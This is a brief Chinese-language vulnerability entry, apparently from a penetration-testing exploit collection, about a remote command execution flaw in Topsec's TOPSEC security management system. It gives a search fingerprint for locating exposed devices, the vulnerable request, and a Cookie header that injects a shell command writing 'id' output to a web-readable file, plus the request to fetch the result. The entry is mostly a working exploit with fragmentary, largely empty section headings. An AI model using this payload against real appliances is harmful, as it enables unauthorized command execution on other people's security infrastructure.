# 天融信TOPSECCookie远程命令执行漏洞

- **系统**：天融信TOPSECCookie　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`web.body="/cgi/maincgi.cgi?Url=VerifyCode"`
- **请求**：`GET /cgi/maincgi.cgi?Url=aa HTTP/1.1`
- **关键头**：`Cookie: session_id_443=1echo `id`  > /www/htdocs/site/image/tt.txt;`

**请求体 / payload**
```

获取命令执行结果
GET /site/image/tt.txt HTTP/1.1
Host:

\[test\_qrcode\_b-rce.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- 天融信TOPSEC Cookie 远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 天融信TopSec安全管理系统